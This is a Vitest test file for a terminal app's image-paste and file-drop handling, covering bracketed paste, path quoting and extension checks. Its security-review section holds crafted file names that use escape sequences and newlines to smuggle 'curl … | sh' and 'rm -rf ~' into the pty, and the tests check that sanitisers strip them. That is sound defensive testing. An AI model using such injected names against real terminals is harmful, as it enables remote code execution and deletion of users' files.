import { describe, it, expect, vi } from 'vitest'
import { persistFiles, imageFilesFrom, bracketedPaste, isImagePath, writesForDroppedPaths, ptyPath, pastePaths, safeExt } from './paste-image'

// jsdom's File.arrayBuffer() doesn't reliably round-trip bytes, so use explicit
// File-like stubs — this also lets us simulate an unreadable file deterministically.
function fakeFile(bytes: number[] | null, name: string, type: string, path?: string): File {
  const f: Record<string, unknown> = { name, type }
  if (path) f.path = path
  f.arrayBuffer =
    bytes === null
      ? () => Promise.reject(new Error('unreadable'))
      : () => Promise.resolve(new Uint8Array(bytes).buffer)
  return f as unknown as File
}

describe('persistFiles', () => {
  it('reads bytes, base64-encodes, and returns the saved path', async () => {
    const save = vi.fn(async (_b64: string, ext: string) => `/tmp/operator-pastes/x.${ext}`)
    const paths = await persistFiles([fakeFile([1, 2, 3], 'shot.png', 'image/png')], save)
    expect(paths).toEqual(['/tmp/operator-pastes/x.png'])
    expect(save).toHaveBeenCalledTimes(1)
    const [b64, ext] = save.mock.calls[0]
    expect(ext).toBe('png')
    expect(atob(b64)).toBe('\x01\x02\x03')
  })

  it('derives the extension from the mime type when the name has none', async () => {
    const save = vi.fn(async (_b64: string, ext: string) => `/tmp/p.${ext}`)
    await persistFiles([fakeFile([0], 'clipboard', 'image/jpeg')], save)
    expect(save.mock.calls[0][1]).toBe('jpeg')
  })

  it('uses an existing on-disk path without calling save', async () => {
    const save = vi.fn()
    const paths = await persistFiles([fakeFile([], 'a.png', 'image/png', '/real/a.png')], save)
    expect(paths).toEqual(['/real/a.png'])
    expect(save).not.toHaveBeenCalled()
  })

  it('skips an unreadable file but keeps the rest, in order', async () => {
    const save = vi.fn(async (_b64: string, ext: string) => `/tmp/ok.${ext}`)
    const bad = fakeFile(null, 'bad.png', 'image/png')
    const good = fakeFile([9], 'good.png', 'image/png')
    const paths = await persistFiles([bad, good], save)
    expect(paths).toEqual(['/tmp/ok.png'])
  })
})

describe('imageFilesFrom', () => {
  it('returns only image files', () => {
    const img = fakeFile([], 'a.png', 'image/png')
    const txt = fakeFile([], 'a.txt', 'text/plain')
    const dt = { files: [img, txt] } as unknown as DataTransfer
    expect(imageFilesFrom(dt)).toEqual([img])
  })

  it('handles a null DataTransfer', () => {
    expect(imageFilesFrom(null)).toEqual([])
  })
})

// ONE DELIVERY PER GESTURE, and it has to be the `[Image #N]` one. Under Electron a dropped
// screenshot arrived TWICE — the pane's bracketed temp path AND, from the preload's window
// listener, the literal quoted real path:
//   '/var/folders/…/Screenshot 2026-08-21 at 8.59.45 PM.png' [Image #4]
// The pane now stops its own drops from reaching the window listener; what is left for the
// window listener is drops that land anywhere ELSE, and these are the writes it makes.
describe('bracketedPaste', () => {
  it('is what makes Claude Code attach a path instead of printing it', () => {
    expect(bracketedPaste('/tmp/a.png')).toBe('\x1b[200~/tmp/a.png\x1b[201~')
  })
})

describe('isImagePath', () => {
  it('knows the extensions Claude Code will attach, case-insensitively', () => {
    for (const p of ['/tmp/a.png', '/tmp/a.JPG', '/tmp/a.jpeg', '/tmp/a.gif', '/tmp/a.webp', '/tmp/a.BMP']) {
      expect(isImagePath(p)).toBe(true)
    }
  })

  it('is not fooled by a dot in a directory name, or by no extension at all', () => {
    expect(isImagePath('/tmp/my.photos/notes')).toBe(false)
    expect(isImagePath('/tmp/README')).toBe(false)
    expect(isImagePath('/tmp/.png')).toBe(false) // a dotfile named ".png" is not an image
    expect(isImagePath('/tmp/archive.zip')).toBe(false)
    expect(isImagePath('/tmp/clip.heic')).toBe(false) // real image, but not one it attaches
  })
})

describe('writesForDroppedPaths', () => {
  it('sends an image as ONE bracketed paste, raw — quoting it would defeat the attachment', () => {
    const shot = '/var/folders/x/TemporaryItems/Screenshot 2026-08-21 at 8.59.45 PM.png'
    expect(writesForDroppedPaths([shot])).toEqual([`\x1b[200~${shot}\x1b[201~`])
  })

  it('keeps the shell-quoted plain write for anything that is not an image', () => {
    expect(writesForDroppedPaths(['/tmp/notes.txt'])).toEqual(['/tmp/notes.txt '])
    expect(writesForDroppedPaths(['/tmp/my notes.txt'])).toEqual(["'/tmp/my notes.txt' "])
    expect(writesForDroppedPaths(["/tmp/it's here.txt"])).toEqual(["'/tmp/it'\\''s here.txt' "])
  })

  it('groups a multi-file drop into at most two writes, images first', () => {
    expect(writesForDroppedPaths(['/a.png', '/notes.txt', '/b.jpg'])).toEqual([
      '\x1b[200~/a.png /b.jpg\x1b[201~',
      '/notes.txt ',
    ])
  })

  it('writes nothing for nothing', () => {
    expect(writesForDroppedPaths([])).toEqual([])
  })
})

// Security review 2026-10-02, R4: a dropped file's name reaches the pty, so a name that carries
// `ESC[201~` must not end the paste, and its extension must not carry anything into the temp path.
describe('dropped names never carry control characters into the pty', () => {
  const crafted = '/tmp/x\x1b[201~\x15!curl -s h|sh\r.png'

  it('ptyPath removes control characters, line breaks and tabs', () => {
    expect(ptyPath(crafted)).toBe('/tmp/x[201~!curl -s h|sh.png')
    expect(ptyPath('/tmp/a\nb\tc\x9b201~.txt')).toBe('/tmp/abc201~.txt')
    expect(ptyPath('/tmp/Screenshot 2026-08-21 at 8.59.45 PM.png')).toBe('/tmp/Screenshot 2026-08-21 at 8.59.45 PM.png')
  })

  it('pastePaths holds exactly one paste terminator, its own', () => {
    const out = pastePaths([crafted, '/tmp/b.png'])
    expect(out).toBe('\x1b[200~/tmp/x[201~!curl -s h|sh.png /tmp/b.png\x1b[201~')
    expect(out.split('\x1b').length - 1).toBe(2)
  })

  it('writesForDroppedPaths strips both the paste and the plain write', () => {
    expect(writesForDroppedPaths([crafted])).toEqual(['\x1b[200~/tmp/x[201~!curl -s h|sh.png\x1b[201~'])
    // In the plain write a newline would be Enter in a shell.
    expect(writesForDroppedPaths(['/tmp/a\nrm -rf ~\n.txt'])).toEqual(["'/tmp/arm -rf ~.txt' "])
    expect(writesForDroppedPaths(['\x1b\x15'])).toEqual([])
  })

  it('safeExt keeps 1-8 letters or digits, lowercased, and refuses anything else', () => {
    expect(safeExt('PNG')).toBe('png')
    expect(safeExt('.jpeg')).toBe('jpeg')
    expect(safeExt('markdown')).toBe('markdown')
    for (const bad of ['', 'png\x1b[201~', 'svg+xml', 'p g', 'png/../x', 'toolongext', '\u00e9']) {
      expect(safeExt(bad), JSON.stringify(bad)).toBeNull()
    }
  })

  it('persistFiles names the temp file with a safe extension only', async () => {
    const save = vi.fn(async (_b64: string, ext: string) => `/tmp/p.${ext}`)
    await persistFiles([fakeFile([0], 'shot.png\x1b[201~\x15', 'image/png')], save)
    expect(save.mock.calls[0][1]).toBe('png') // the name's extension refused, the mime subtype used
    await persistFiles([fakeFile([0], 'a.p\x1bng', 'image/svg+xml')], save)
    expect(save.mock.calls[1][1]).toBe('png') // both refused, the default used
  })
})
